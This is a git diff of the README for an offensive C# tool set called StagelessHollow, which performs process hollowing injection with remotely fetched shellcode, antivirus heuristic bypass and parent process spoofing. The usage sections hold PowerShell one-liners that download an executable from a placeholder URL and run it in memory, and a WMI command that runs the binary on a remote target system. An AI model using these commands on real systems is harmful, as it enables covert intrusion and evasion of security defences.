@@ -1,5 +1,5 @@
 # StagelessHollow
-Multiple C# based tools that perform the Process Hollowing injection technique, can hold- or remotely fetch base64 encoded shellcode, doesn't require any arguments to operate and have some additional AV heuristic bypass techniques baked in. Furthermore, the ParentProcessInjection tool performs the parent spoofing technique to further obfuscate its presence. 
+These C# based executables perform the Process Hollowing injection technique, can hold- or remotely fetch base64 encoded shellcode, doesn't require any arguments to operate and have some additional AV heuristic bypass techniques baked in. Furthermore, the ParentProcessInjection tool performs the parent spoofing technique to further obfuscate its presence. 
 
 ### Prepare & compile tool:
 <b>ParentHollowInjection:</b>
@@ -22,11 +22,11 @@ Multiple C# based tools that perform the Process Hollowing injection technique, 
 ### Usage examples:
 <b>ParentHollowInjection:</b>
 
-Load ParentHollowInjector.exe from remote location and execute in memory using PowerShell:
+Load ParentHollowInjection.exe from remote location and execute in memory using PowerShell:
 ```
-[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("https://<URL>/ParentHollowInjector.exe")); [ParentHollowInjector.Program]::Main(@(""))
+[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("https://<URL>/ParentHollowInjection.exe")); [ParentHollowInjection.Program]::Main(@())
 ```
-After uploading ParentHollowInjector.exe to a target system, execute it remotely from disk:
+After uploading ParentHollowInjection.exe to a target system, execute it remotely from disk:
 ```
 Invoke-WmiMethod –ComputerName <FQDN target system> -Class win32_process -Name create -ArgumentList "C:\Windows\Temp\ParentHollowInjection.exe"
 ```
@@ -37,9 +37,9 @@ Run tool from disk with optional argument to specify the program that is used to
 ```
 C:\Windows\Temp\HollowInjection.exe [/program:C:\<path to program.exe>]
 ```
-Load tool from remote location and execute in memory with argument specified:
+Load tool from remote location and execute in memory with the '/program:' argument specified:
 ```
-[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("https://<URL>/HollowInjector.exe")); [HollowInjector.Program]::Main(@("/program:C:\Windows\System32\notepad.exe"))
+[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("https://<URL>/HollowInjection.exe")); [HollowInjection.Program]::Main(@("/program:C:\Windows\System32\notepad.exe"))
 ```
 
 ### Credit & References:
